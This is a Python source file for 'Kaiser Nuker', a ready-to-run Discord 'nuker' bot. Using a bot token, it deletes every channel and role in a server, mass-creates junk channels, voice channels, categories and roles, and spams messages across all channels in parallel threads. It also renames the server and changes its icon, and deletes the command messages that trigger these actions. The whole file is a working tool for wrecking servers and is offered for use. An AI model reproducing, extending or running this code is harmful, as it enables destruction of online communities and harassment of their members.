import os
from pystyle import Colors, Colorate
import json

modules = ["discord", "discord.py", "requests", "pystyle"]
try:
    import discord, requests, pystyle
except ImportError:
    print(Colorate.Horizontal(Colors.purple_to_blue, " [!] Checking if you have the modules installed. . .", 1, 0))
    for libraries in modules:
        os.system(f"pip install {libraries}")


import discord
from discord.ext import commands
import requests
import threading
import base64
import random

os.system("title Kaiser Nuker")

os.system("cls")


with open("config.json", "r") as jsonfile:
    data = json.load(jsonfile)

token = data["token"]
prefix = data["prefix"]
channel_names = data["channel_names"]
role_names = data["role_names"]
message_content = data["message_content"]


headers = {
    "Authorization": f"Bot {token}"
}


intents = discord.Intents.all()
kaiser = commands.Bot(command_prefix=prefix, intents=intents)
kaiser.remove_command("help")


banner = """

   ▄█   ▄█▄    ▄████████  ▄█     ▄████████    ▄████████    ▄████████ 
  ███ ▄███▀   ███    ███ ███    ███    ███   ███    ███   ███    ███ 
  ███▐██▀     ███    ███ ███▌   ███    █▀    ███    █▀    ███    ███ 
 ▄█████▀      ███    ███ ███▌   ███         ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀█████▄    ▀███████████ ███▌ ▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███▐██▄     ███    ███ ███           ███   ███    █▄  ▀███████████ 
  ███ ▀███▄   ███    ███ ███     ▄█    ███   ███    ███   ███    ███ 
  ███   ▀█▀   ███    █▀  █▀    ▄████████▀    ██████████   ███    ███ 
  ▀                                                       ███    ███ 
                     Made by SWEET and Woods

"""

print(Colorate.Vertical(Colors.blue_to_purple, banner, 1, 0))


@kaiser.event
async def on_ready():
    print(Colorate.Horizontal(Colors.purple_to_blue, f"\n [+] Connected as: {kaiser.user}", 1, 0))
    print(Colorate.Horizontal(Colors.purple_to_blue, f" [+] ID: {kaiser.user.id}", 1, 0))
    print(Colorate.Horizontal(Colors.purple_to_blue, f" [+] Type {prefix}help To view the Commands", 1, 0))



def channel_deleter(channel_id):
    try:
        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
    except:
        pass


def role_deleter(guild_id, role_id):
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
    except:
        pass


def channel_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 0
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def voice_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 2
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def category_creater(guild_id):
    payload = {
        "name": channel_names,
        "permission_overwrites": [],
        "type": 4
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
    except:
        pass


def role_creater(guild_id):
    payload = {
        "name": role_names,
        "color": random.randint(0, 0xffffff)
    }
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=payload)
    except:
        pass


def messages_spam(channel_id):
    payload = {
        "content": message_content,
        "tts": False
    }
    try:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
    except:
        pass


def change_guild_name(guild_id, name):
    payload = {
        "name": name
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass


def change_guild_icon(guild_id, url):
    encode = base64.b64encode(requests.get(url).content).decode()
    payload = {
        "icon": f"data:image/jpeg;base64,{encode}"
    }
    try:
        requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=payload)
    except:
        pass



@kaiser.command()
async def nuke(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()

    for i in range(100):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()

    for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()

    for i in range(100):
        threading.Thread(target=role_creater, args=(ctx.guild.id,)).start()


@kaiser.command()
async def cdel(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()


@kaiser.command()
async def rdel(ctx):
    await ctx.message.delete()

    for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()


@kaiser.command()
async def ccr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()


@kaiser.command()
async def vccr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=voice_creater, args=(ctx.guild.id,)).start()


@kaiser.command()
async def ctcr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=category_creater, args=(ctx.guild.id,)).start()


@kaiser.command()
async def rcr(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        threading.Thread(target=role_creater, args=(ctx.guild.id,)).start()


@kaiser.command()
async def spam(ctx, amount: int):
    await ctx.message.delete()

    for i in range(amount):
        for channel in ctx.guild.channels:
            threading.Thread(target=messages_spam, args=(channel.id,)).start()


@kaiser.command()
async def rename(ctx, *, name):
    await ctx.message.delete()

    change_guild_name(ctx.guild.id, name)


@kaiser.command()
async def changeicon(ctx, url):
    await ctx.message.delete()

    change_guild_icon(ctx.guild.id, url)




@kaiser.command()
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(
        title="Kaiser Nuker Menù",
        description=f"""```
{prefix}nuke - Delete Channels, Delete Roles, Create Channels and Create Roles
{prefix}spam <amount> - Spam in all channels
{prefix}cdel - Delete all Channels
{prefix}rdel - Delete all Roles
{prefix}ccr <amount> - Create Channels
{prefix}vccr <amount> - Create Voice Channels
{prefix}ctcr <amount> - Create Categories
{prefix}rcr <amount> - Create Roles
{prefix}rename <name> - Change Guild Name
{prefix}changeicon <icon_url> - Change Guild Icon```
""",
color = discord.Color.purple()
    )
    embed.set_image(url="https://media1.giphy.com/media/aAbax5anloMNk6TSP9/giphy.gif")
    await ctx.send(embed=embed)




kaiser.run(token)